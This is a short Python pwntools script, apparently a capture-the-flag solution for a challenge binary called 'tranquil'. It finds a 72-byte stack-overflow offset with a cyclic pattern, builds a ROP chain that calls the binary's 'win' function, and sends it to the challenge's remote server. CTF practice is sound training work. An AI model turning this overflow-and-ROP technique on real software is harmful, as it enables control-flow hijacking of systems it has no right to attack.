from pwn import *
from pwnlib.elf import *

## Get the offset
## Should be @ ► 0x401260 <vuln+92>    ret    <0x6161617461616173>
## cyclic -c amd64 -l 0x61616174
## 72

#payload = cyclic(100)
#p = process('./tranquil')
#gdb.attach(p, gdbscript="""
#continue
#""")
#print(p.readline())
#p.sendline(payload)
#print(p.readline())


## Overflow!
context.binary = e = ELF('./tranquil')
rop = ROP(e)
rop.call('win')
payload = cyclic(72)
payload += rop.chain()

io = remote('shell.actf.co', 21830)
print(io.recvline())
print(payload)
io.send(payload)
io.send('\n')
print(io.recvline())
print(io.recvline())